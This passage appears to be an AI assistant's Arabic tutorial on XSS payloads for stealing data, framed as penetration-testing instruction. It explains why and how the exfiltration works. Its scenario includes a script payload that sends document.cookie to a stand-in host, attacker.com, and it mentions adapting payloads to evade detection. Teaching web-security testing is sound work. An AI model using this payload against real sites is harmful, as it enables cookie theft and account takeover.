بناءً على طلبك لشرح **الحقن المستخدمة لاستخراج البيانات (Data Exfiltration Payloads)** باستخدام نفس طريقة الشرح المقدمة (التي تتضمن أقسامًا مثل "ما المقصود؟"، "لماذا يعمل؟"، "كيف يتم الاستغلال؟"، والخطوات العملية)، سأقدم شرحًا مفصلاً ومنظمًا لهذه الخطوة في اختبار ثغرات Cross-Site Scripting (XSS). سأغطي جميع المحاولات الممكنة لاستخراج البيانات الحساسة (مثل ملفات تعريف الارتباط، بيانات المستخدم، أو محتوى الصفحة) عبر استغلال ثغرة XSS، مع تقسيمها إلى فئات (مثل استخراج ملفات تعريف الارتباط، استخراج محتوى DOM، وإرسال البيانات إلى خادم خارجي). سيتم تضمين المحتوى في علامة `<xaiArtifact>` كما هو مطلوب، مع معرف جديد لأن هذا طلب مستقل يركز على خطوة محددة. سأحافظ على الشرح باللغة العربية بأسلوب واضح ومنظم، متجنبًا تنسيق Markdown خارج العلامة بناءً على طلبك السابق.

---

## فهم الخطوة: الحقن المستخدمة لاستخراج البيانات (Data Exfiltration Payloads)

### ما المقصود؟
الحقن المستخدمة لاستخراج البيانات هي شيفرات JavaScript تُستخدم في استغلال ثغرات Cross-Site Scripting (XSS) لسرقة معلومات حساسة من صفحة الضحية، مثل ملفات تعريف الارتباط (cookies)، بيانات المستخدم (مثل أسماء المستخدمين أو البريد الإلكتروني)، محتوى الصفحة (مثل النصوص أو السمات)، أو بيانات الجلسة. تُصمم هذه الحقن لجمع البيانات وإرسالها إلى خادم يتحكم فيه المهاجم، عادةً عبر طلبات HTTP (مثل GET أو POST) أو تقنيات أخرى (مثل WebSocket). تُستخدم هذه الحقن في سياقات **XSS المنعكس**، **XSS المخزن**، و**XSS القائم على DOM** بعد تأكيد وجود الثغرة.

### لماذا يعمل؟
- **وصول JavaScript إلى DOM**: يتيح JavaScript الوصول إلى بيانات الصفحة (مثل `document.cookie`، `document.body.innerHTML`) والتلاعب بها.
- **إرسال البيانات**: يمكن لـ JavaScript إرسال البيانات إلى خادم خارجي عبر طلبات HTTP (مثل `Image.src`، `XMLHttpRequest`) أو عبر تقنيات مثل WebSocket.
- **ضعف الحماية**: العديد من التطبيقات لا تطبق سياسات أمان مثل `HttpOnly` لملفات تعريف الارتباط أو `Content Security Policy (CSP)`، مما يسمح باستخراج البيانات.
- **تنفيذ تلقائي**: يمكن تنفيذ الحقن تلقائيًا (مثل عبر `<script>` أو `onload`) دون تفاعل المستخدم، مما يجعل الاستغلال مخفيًا.
- **مرونة الإرسال**: يمكن إرسال البيانات إلى خادم المهاجم بطرق متعددة، مما يتجاوز بعض القيود مثل فلاتر الشبكة.

### كيف يتم الاستغلال؟
- يتم إدخال شيفرة JavaScript في نقطة إدخال عرضة لـ XSS (مثل معلمات URL، حقول نماذج، أو تعليقات) لتنفيذها في متصفح الضحية.
- تُصمم الشيفرة لجمع بيانات حساسة (مثل `document.cookie`، محتوى عنصر معين، أو بيانات الجلسة).
- تُرسل البيانات إلى خادم خارجي يتحكم فيه المهاجم باستخدام طلبات HTTP، صور، أو قنوات اتصال أخرى.
- يتم مراقبة الخادم الخارجي لتأكيد استلام البيانات:
  - **نجاح (True)**: البيانات تظهر في سجلات الخادم (مثل ملفات تعريف الارتباط أو محتوى الصفحة).
  - **فشل (False)**: لا تصل بيانات، أو يتم حظر الطلب (مثل بسبب CSP أو Same-Origin Policy).
- تُكيَّف الحقن لتجنب الكشف (مثل تقليل حجم البيانات أو تشفيرها) ولتجاوز القيود مثل فلاتر الشبكة.

### السناريو
لنفترض أنك اكتشفت ثغرة XSS في موقع إلكتروني يسمح بتنفيذ شيفرة JavaScript عبر حقل تعليق أو معلمة URL (مثل `https://example.com/?search=<script>alert('XSS')</script>`). بعد تأكيد الثغرة باستخدام تنبيه بسيط، تريد الآن استخراج بيانات حساسة مثل ملفات تعريف الارتباط (`document.cookie`) أو محتوى الصفحة (مثل اسم المستخدم من عنصر `<span id="username">`). تقوم بإعداد خادم خارجي (مثل `http://attacker.com/log`) لتسجيل البيانات، ثم تُدخل حقنة مثل `<script>new Image().src='http://attacker.com/log?c='+document.cookie</script>` في نقطة الإدخال. إذا تلقى خادمك البيانات، فهذا يؤكد نجاح استخراج البيانات.

---
